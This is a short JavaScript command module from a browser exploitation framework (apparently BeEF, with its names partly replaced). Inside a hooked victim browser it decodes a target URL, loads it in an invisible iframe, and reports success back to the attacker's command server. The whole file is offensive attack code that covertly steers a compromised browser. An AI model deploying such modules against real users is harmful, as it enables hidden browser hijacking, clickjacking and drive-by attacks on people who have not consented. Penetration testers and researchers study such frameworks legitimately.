//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	var target = decodeURIComponent(server.encode.base64.decode('<%= Base64.strict_encode64(@target) %>'));
	var iframe_<%= @command_id %> = server.dom.createInvisibleIframe();
	iframe_<%= @command_id %>.setAttribute('src', target);

	server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=IFrame created');

});
